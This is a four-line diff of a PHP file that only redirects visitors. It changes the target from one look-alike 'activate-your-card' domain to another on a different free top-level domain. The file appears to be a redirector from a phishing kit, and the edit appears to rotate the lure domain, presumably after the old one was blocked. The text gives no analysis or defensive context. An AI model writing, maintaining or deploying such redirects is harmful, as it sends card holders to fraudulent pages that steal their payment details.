@@ -1,4 +1,4 @@
 <?php
-header("Location: https://activate-your-card.ga/actmca/");
+header("Location: https://activate-your-card.cf/actmca/");
 die();
 ?>
